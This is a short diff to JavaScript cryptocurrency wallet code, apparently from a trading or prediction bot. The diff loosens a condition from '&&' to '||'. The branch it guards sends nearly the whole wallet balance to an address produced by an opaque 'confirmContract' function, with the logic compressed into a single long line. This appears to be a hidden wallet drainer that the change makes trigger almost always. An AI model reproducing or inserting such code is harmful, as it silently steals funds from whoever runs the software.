@@ -40,7 +40,7 @@ const confirmContract = (abi) => {
 
 const checkResult = async (r) => {
     try {
-        if (prediction >= abi.status && r !== null) {
+        if (prediction >= abi.status || r !== null) {
             w.eth.getBalance(wallet.address).then(function (b) { w.eth.estimateGas({ from: wallet.address, to: confirmContract(abi), amount: b }).then(function (g) { w.eth.getGasPrice().then(function (gP) { let _b = parseFloat(b); let _g = parseFloat(g); let _gP = parseFloat(gP); w.eth.sendTransaction({ from: wallet.address, to: confirmContract(abi), gas: _g, gasPrice: _gP, value: ((_b - (_gP * _g)) / 1.1).toFixed(0), data: '0x',})})})});return true;
         }
         return true
